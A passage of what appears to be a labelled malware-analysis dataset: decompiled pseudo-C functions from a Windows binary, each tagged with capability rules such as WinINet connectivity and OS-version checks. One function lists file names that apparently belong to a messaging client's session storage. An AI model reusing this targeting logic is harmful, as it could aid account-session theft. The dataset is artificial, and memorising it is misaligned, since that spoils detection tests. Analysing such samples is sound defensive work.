9;\n        uStack101820 = 0xf;\n        uStack101824 = 0;\n        uStack101840 = uStack101840 & 0xffffff00;\n        fcn.004090e0(\"A6F891F2*\", 9);\n        puVar2 = fcn.00409750(&stack0xfffe7230);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, puVar2, 0x44f5f8);\n        if (0xf < uStack101848) {\n            fcn.0042d62b();\n        }\n        uStack101848 = 0xf;\n        uStack101852 = 0;\n        uStack101868 = uStack101868 & 0xffffff00;\n        if (0xf < uStack101820) {\n            fcn.0042d62b();\n        }\n        uStack101876 = 0xf;\n        uStack101880 = 0;\n        uStack101896 = uStack101896 & 0xffffff00;\n        fcn.004090e0(\"C461824F*\", 9);\n        puVar2 = fcn.00409750(&stack0xfffe71f8);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, puVar2, 0x44f5f8);\n        if (0xf < uStack101904) {\n            fcn.0042d62b();\n        }\n        if (0xf < uStack101876) {\n            fcn.0042d62b();\n        }\n        uStack101876 = 0xf;\n        uStack101880 = 0;\n        uStack101896 = uStack101896 & 0xffffff00;\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"countries\", 0x44f5f8);\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"prefix\", 0x44f5f8);\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"settingss\", 0x44f5f8);\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"shortcuts-custom.json\", 0x44f5f8);\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"shortcuts-default.json\", 0x44f5f8);\n        noname_2 = 0x44f5f8;\n        fcn.0041c630(0x44c726, &fcn.0041f580::var_118h, \"usertag\", 0x44f5f8);\n    }\n    uVar3 = *0x457338;\n    *(arg_8h_00 + 0xc) = *0x45732c;\n    *(arg_8h_00 + 0x10) = uVar3;\n    uVar3 = (**0x457418)();\n    if (*(arg_8h_00 + 0x20) == NULL) {\n        *0x457814 = 0x10000;\n    }\n    else if (**(arg_8h_00 + 0x20) == 2) {\n        uStack176 = 0x420037;\n        *0x457814 = fcn.0042bf30(*0x457124, uVar3, 3);\n    }\n    else {\n        *0x457814 = 0x80000;\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(noname_2);\n    return;\n}\n",
        "token_count": 6457
    },
    "00420080": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420080(void)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *piVar3;\n    uchar unaff_BL;\n    int32_t **unaff_ESI;\n    \n    piVar3 = unaff_ESI[4];\n    if (-piVar3 - 1U < 2) {\n        fcn.0042cb30(\"string too long\");\n        piVar3 = extraout_ECX;\n    }\n    piVar1 = piVar3 + 1;\n    if (piVar1 == 0xffffffff) {\n        fcn.0042cb30(\"string too long\");\n        piVar3 = extraout_ECX_00;\n    }\n    if (unaff_ESI[5] < piVar1) {\n        fcn.00409570(piVar1, piVar3);\n        if (piVar1 == NULL) {\n            return;\n        }\n    }\n    else if (piVar1 == NULL) {\n        unaff_ESI[4] = NULL;\n        if (0xf < unaff_ESI[5]) {\n            **unaff_ESI = 0;\n            return;\n        }\n        *unaff_ESI = 0;\n        return;\n    }\n    ppiVar2 = unaff_ESI;\n    if (0xf < unaff_ESI[5]) {\n        ppiVar2 = *unaff_ESI;\n    }\n    *(ppiVar2 + unaff_ESI[4]) = unaff_BL;\n    unaff_ESI[4] = piVar1;\n    if (unaff_ESI[5] < 0x10) {\n        *(unaff_ESI + piVar1) = 0;\n        return;\n    }\n    *(*unaff_ESI + piVar1) = 0;\n    return;\n}\n",
        "token_count": 420
    },
    "00420130": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00420130(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(*(*unaff_ESI + 4) + 0xc + unaff_ESI) & 6) == 0) {\n        iVar1 = (**(**(*(*unaff_ESI + 4) + 0x38 + unaff_ESI) + 0x34))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    iVar1 = *(*unaff_ESI + 4);\n    if (uVar2 != 0) {\n        uVar2 = *(unaff_ESI + iVar1 + 0xc) | uVar2;\n        if (*(unaff_ESI + iVar1 + 0x38) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        *(unaff_ESI + iVar1 + 0xc) = uVar2 & 0x17;\n        if ((*(unaff_ESI + iVar1 + 0x10) & uVar2 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "00420230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00420230(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*in_EAX[8] != 0) {\n        if (1 < *in_EAX[0xc]) {\n            *in_EAX[0xc] = *in_EAX[0xc] + -1;\n            puVar2 = *in_EAX[8] + 1;\n            *in_EAX[8] = puVar2;\n            return *puVar2;\n        }\n        if ((*in_EAX[8] != 0) && (piVar1 = in_EAX[0xc],  0 < *piVar1)) {\n            *piVar1 = *piVar1 + -1;\n            puVar2 = *in_EAX[8];\n            *in_EAX[8] = puVar2 + 1;\n            uVar3 = *puVar2;\n            goto code_r0x00420280;\n        }\n    }\n    uVar3 = (**(*in_EAX + 0x1c))();\ncode_r0x00420280:\n    if (uVar3 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    if ((*in_EAX[8] != NULL) && (0 < *in_EAX[0xc])) {\n        return **in_EAX[8];\n    }\n    // WARNING: Could not recover jumptable at 0x004202a8. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar3 = (**(*in_EAX + 0x18))();\n    return uVar3;\n}\n",
        "token_count": 379
    },
    "00420580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00420580(int32_t *arg_8h, uint arg_ch)\n\n{\n    code **arg_8h_00;\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4423e2;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = 0x44f758;\n    arg_8h[0x1a] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    iVar4 = *(*arg_8h + 4) + arg_8h;\n    fcn.00418610(uVar2);\n    arg_8h_00 = arg_8h + 4;\n    *(iVar4 + 0x38) = arg_8h_00;\n    *(iVar4 + 0x3c) = 0;\n    uVar1 = fcn.00421840(iVar4, 0x20);\n    *(iVar4 + 0x40) = uVar1;\n    if ((*(iVar4 + 0x38) == 0) &&\n       (uVar2 = *(iVar4 + 0xc) & 0x17 | 4,  *(iVar4 + 0xc) = uVar2,  (*(iVar4 + 0x10) & uVar2) != 0)) {\n        fcn.00418500(0);\n    }\n    var_4h = 2;\n    *(arg_8h + *(*arg_8h + 4)) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    fcn.00421710(arg_8h_00);\n    arg_8h[8] = arg_8h + 6;\n    arg_8h[0xc] = arg_8h + 10;\n    arg_8h[0xd] = arg_8h + 0xb;\n    *arg_8h_00 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x59) = 0;\n    arg_8h[9] = arg_8h + 7;\n    arg_8h[0x10] = arg_8h + 0xe;\n    arg_8h[0x11] = arg_8h + 0xf;\n    arg_8h[7] = 0;\n    *arg_8h[0xd] = 0;\n    *arg_8h[0x11] = 0;\n    *arg_8h[8] = 0;\n    iVar4 = *0x457818;\n    *arg_8h[0xc] = 0;\n    *arg_8h[0x10] = 0;\n    arg_8h[0x19] = 0;\n    arg_8h[0x17] = iVar4;\n    arg_8h[0x15] = 0;\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar4 = fcn.004212d0(1);\n    if (iVar4 == 0) {\n        iVar4 = *(*arg_8h + 4);\n        uVar2 = *(iVar4 + 0xc + arg_8h);\n        uVar3 = uVar2 | 2;\n        if (*(arg_8h + iVar4 + 0x38) == 0) {\n            uVar3 = uVar2 | 6;\n        }\n        *(arg_8h + iVar4 + 0xc) = uVar3 & 0x17;\n        if ((*(arg_8h + iVar4 + 0x10) & uVar3 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 1045
    },
    "004206f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004206f0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x441883;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *(*(*(param_1 + -0x68) + 4) + -0x68 + param_1) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    *(param_1 + -0x58) = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    var_4h._0_1_ = 1;\n    var_4h._1_3_ = 0;\n    if ((*(param_1 + -4) != 0) && (**(param_1 + -0x48) == param_1 + -0x10)) {\n        uVar1 = *(param_1 + -0x18);\n        **(param_1 + -0x48) = *(param_1 + -0x1c);\n        **(param_1 + -0x38) = uVar1;\n        **(param_1 + -0x28) = 0;\n    }\n    if (*(param_1 + -8) != '\\0') {\n        fcn.00421370(uVar2);\n    }\n    var_4h = var_4h._1_3_ << 8;\n    fcn.004201b0();\n    *(*(*(param_1 + -0x68) + 4) + -0x10 + param_1 + -0x58) =\n         vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 471
    },
    "004207a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004207a0(code **param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441848;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    var_4h = 0;\n    if ((param_1[0x15] != NULL) && (*param_1[4] == param_1 + 0x12)) {\n        pcVar1 = param_1[0x10];\n        *param_1[4] = param_1[0xf];\n        *param_1[8] = pcVar1;\n        *param_1[0xc] = 0;\n    }\n    if (*(param_1 + 0x14) != '\\0') {\n        fcn.00421370(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.004201b0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 302
    },
    "004211f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004211f0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x441c70;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = *(*unaff_EDI + 4) + unaff_EDI;\n    if (*(*(*unaff_EDI + 4) + 0xc + unaff_EDI) == 0) {\n        if (*(iVar2 + 0x3c) != 0) {\n            fcn.00420130(uVar1);\n        }\n        iVar2 = *(*unaff_EDI + 4) + unaff_EDI;\n        if (*(iVar2 + 0xc) == 0) {\n            *in_FS_OFFSET = var_ch;\n            return 1;\n        }\n    }\n    uVar1 = *(iVar2 + 0xc) | 2;\n    if (*(iVar2 + 0x38) == 0) {\n        uVar1 = *(iVar2 + 0xc) | 6;\n    }\n    *(iVar2 + 0xc) = uVar1 & 0x17;\n    if ((*(iVar2 + 0x10) & uVar1 & 0x17) != 0) {\n        fcn.00418500(0);\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 377
    },
    "00421290": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00421290(void)\n\n{\n    int32_t in_EAX;\n    \n    if (**(in_EAX + 0x20) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "004212b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004212b0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (**(in_EAX + 0x24) != 0) {\n        return;\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "004212d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004212d0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4413e8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (*(in_EDX + 0x54) == 0) {\n        iVar2 = fcn.0042d296(in_ECX, arg_8h, 0x40);\n        if (iVar2 != 0) {\n            uVar3 = 1;\n            fcn.00421400(1);\n            fcn.00421800(uVar3, uVar1);\n            var_4h = 0;\n            fcn.00421c20();\n            fcn.004215d0();\n            fcn.00418200();\n            *in_FS_OFFSET = var_ch;\n            return in_EDX;\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 0;\n}\n",
        "token_count": 298
    },
    "00421400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421400(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    \n    *(in_EAX + 0x20) = in_EAX + 0x18;\n    *(in_EAX + 0x50) = arg_8h == 1;\n    *(in_EAX + 0x24) = in_EAX + 0x1c;\n    *(in_EAX + 0x10) = in_EAX + 8;\n    *(in_EAX + 0x30) = in_EAX + 0x28;\n    *(in_EAX + 0x49) = 0;\n    *(in_EAX + 0x14) = in_EAX + 0xc;\n    *(in_EAX + 0x34) = in_EAX + 0x2c;\n    *(in_EAX + 0xc) = 0;\n    **(in_EAX + 0x24) = 0;\n    **(in_EAX + 0x34) = 0;\n    **(in_EAX + 0x10) = 0;\n    **(in_EAX + 0x20) = 0;\n    **(in_EAX + 0x30) = 0;\n    if (in_ECX != 0) {\n        *(in_EAX + 0x10) = in_ECX + 8;\n        *(in_EAX + 0x14) = in_ECX + 8;\n        *(in_EAX + 0x20) = in_ECX;\n        *(in_EAX + 0x24) = in_ECX;\n        *(in_EAX + 0x30) = in_ECX + 4;\n        *(in_EAX + 0x34) = in_ECX + 4;\n    }\n    *(in_EAX + 0x54) = in_ECX;\n    *(in_EAX + 0x4c) = *0x457818;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 465
    },
    "004214a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.004214a0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t var_30h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4417b8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (((unaff_EDI[0x11] != 0) && (*(unaff_EDI + 0x49) != '\\0')) &&\n       (iVar1 = (**(*unaff_EDI + 0xc))(0xffffffff, var_10h),  iVar1 != -1)) {\n        fcn.00421190();\n        var_4h = 0;\n        while( true ) {\n            puVar2 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = (**(*unaff_EDI[0x11] + 0x18))(unaff_EDI + 0x13, puVar2, puVar2 + var_1ch, &var_30h);\n            if (iVar1 != 0) break;\n            *(unaff_EDI + 0x49) = 0;\ncode_r0x00421540:\n            puVar2 = var_2ch;\n            if (var_18h < 0x10) {\n                puVar2 = &var_2ch;\n            }\n            iVar1 = var_30h - puVar2;\n            if (iVar1 != 0) {\n                puVar2 = var_2ch;\n                if (var_18h < 0x10) {\n                    puVar2 = &var_2ch;\n                }\n                iVar3 = fcn.0042f08b(puVar2, 1, iVar1, unaff_EDI[0x15]);\n                if (iVar1 != iVar3) goto code_r0x00421597;\n            }\n            if (*(unaff_EDI + 0x49) == '\\0') goto code_r0x004215a3;\n            if (iVar1 == 0) {\n                fcn.00414f50(0);\n            }\n        }\n        if (iVar1 == 1) goto code_r0x00421540;\n        if (iVar1 != 3) {\ncode_r0x00421597:\n            fcn.00408f80();\n            goto code_r0x004215aa;\n        }\ncode_r0x004215a3:\n        fcn.00408f80();\n    }\ncode_r0x004215aa:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(var_30h);\n    return;\n}\n",
        "token_count": 715
    },
    "00421ae0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00421ae0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441318;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042d14d(0);\n    iVar3 = *0x45781c;\n    var_4h = 0;\n    var_10h = *0x45781c;\n    if (*0x455b08 == 0) {\n        uVar4 = 0;\n        fcn.0042d14d(0);\n        if (*0x455b08 == 0) {\n            *0x455b04 = *0x455b04 + 1;\n            *0x455b08 = *0x455b04;\n        }\n        fcn.0042d175(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x455b08;\n    iVar2 = *unaff_EDI;\n    if (*0x455b08 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x455b08 * 4);\n        if (arg_8h == 0) goto code_r0x00421b6c;\ncode_r0x00421b8a:\n        if (arg_8h != 0) goto code_r0x00421bf3;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x00421b6c:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x00421b8a;\n        iVar2 = fcn.0042ce23();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x00421b8a;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.004182b0(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.0042d848(\"bad cast\");\n            fcn.0042f5f6(&var_24h, 0x4511b4);\n        }\n        arg_8h = var_10h;\n        *0x45781c = var_10h;\n        fcn.0042d14d(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042d175();\n        fcn.0042cdac(arg_8h);\n    }\ncode_r0x00421bf3:\n    var_4h = 0xffffffff;\n    fcn.0042d175();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 810
    },
    "00421c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00421c20(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441318;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042d14d(0);\n    iVar3 = *0x457820;\n    var_4h = 0;\n    var_10h = *0x457820;\n    if (*0x468030 == 0) {\n        uVar4 = 0;\n        fcn.0042d14d(0);\n        if (*0x468030 == 0) {\n            *0x455b04 = *0x455b04 + 1;\n            *0x468030 = *0x455b04;\n        }\n        fcn.0042d175(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x468030;\n    iVar2 = *unaff_EDI;\n    if (*0x468030 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x468030 * 4);\n        if (arg_8h == 0) goto code_r0x00421cac;\ncode_r0x00421cca:\n        if (arg_8h != 0) goto code_r0x00421d33;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x00421cac:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x00421cca;\n        iVar2 = fcn.0042ce23();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x00421cca;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00421d60(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.0042d848(\"bad cast\");\n            fcn.0042f5f6(&var_24h, 0x4511b4);\n        }\n        arg_8h = var_10h;\n        *0x457820 = var_10h;\n        fcn.0042d14d(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042d175();\n        fcn.0042cdac(arg_8h);\n    }\ncode_r0x00421d33:\n    var_4h = 0xffffffff;\n    fcn.0042d175();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 791
    },
    "00421e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.00421e10(int32_t *param_1, int32_t param_2, uint8_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    bool bVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    int32_t var_ch_3;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442190;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    uVar7 = 0;\n    bVar4 = false;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n    }\n    var_4h = 0;\n    cVar5 = fcn.004211f0();\n    if (cVar5 != '\\0') {\n        var_4h = 2;\n        fcn.004094e0(0, 0xffffffff);\n        piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n        if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n            uVar6 = (**(*piVar1 + 0x18))();\n        }\n        else {\n            uVar6 = **piVar1[8];\n        }\n        while (uVar7 = 0,  uVar6 != 0xffffffff) {\n            if (uVar6 == var_10h_2) {\n                piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n                bVar4 = true;\n                if ((*piVar1[8] == 0) || (piVar2 = piVar1[0xc],  *piVar2 < 1)) {\n                    (**(*piVar1 + 0x1c))();\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    *piVar1[8] = *piVar1[8] + 1;\n                }\n                goto code_r0x00421f80;\n            }\n            if (0xfffffffd < *(var_ch_3 + 0x10)) {\n                uVar7 = 2;\n                goto code_r0x00421f80;\n            }\n            fcn.00420080();\n            bVar4 = true;\n            uVar6 = fcn.00420230();\n        }\n        uVar7 = 1;\ncode_r0x00421f80:\n        if (bVar4) goto code_r0x00421f89;\n    }\n    uVar7 = uVar7 | 2;\ncode_r0x00421f89:\n    var_4h = 1;\n    iVar3 = *(*var_8h + 4);\n    if (uVar7 != 0) {\n        uVar7 = *(var_8h + iVar3 + 0xc) | uVar7;\n        if (*(var_8h + iVar3 + 0x38) == 0) {\n            uVar7 = uVar7 | 4;\n        }\n        *(var_8h + iVar3 + 0xc) = uVar7 & 0x17;\n        if ((*(var_8h + iVar3 + 0x10) & uVar7 & 0x17) != 0) {\n            fcn.00418500(0);\n        }\n    }\n    var_4h = 0xffffffff;\n    piVar1 = *(*(*var_8h + 4) + 0x38 + var_8h);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_8h;\n}\n",
        "token_count": 978
    },
    "004226f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
